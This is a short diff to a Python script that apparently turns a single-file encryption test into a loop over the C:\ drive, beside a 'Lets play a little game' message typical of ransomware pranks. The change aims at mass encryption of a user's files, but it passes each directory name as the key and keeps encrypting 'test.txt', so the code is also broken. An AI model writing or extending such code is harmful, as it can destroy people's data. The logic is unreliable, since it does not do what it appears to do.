@@ -53,7 +53,10 @@ def encrypt_file(key, in_filename, out_filename, chunksize):
 
 
 
-encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", "test.txt", None, 64*1024)
+for i in os.listdir("C:\\"):
+    
+    encrypt_file(i, "test.txt", None, 64*1024)
+
 
 #just a fun sad thing I made
 print("Lets play a little game shall we?")
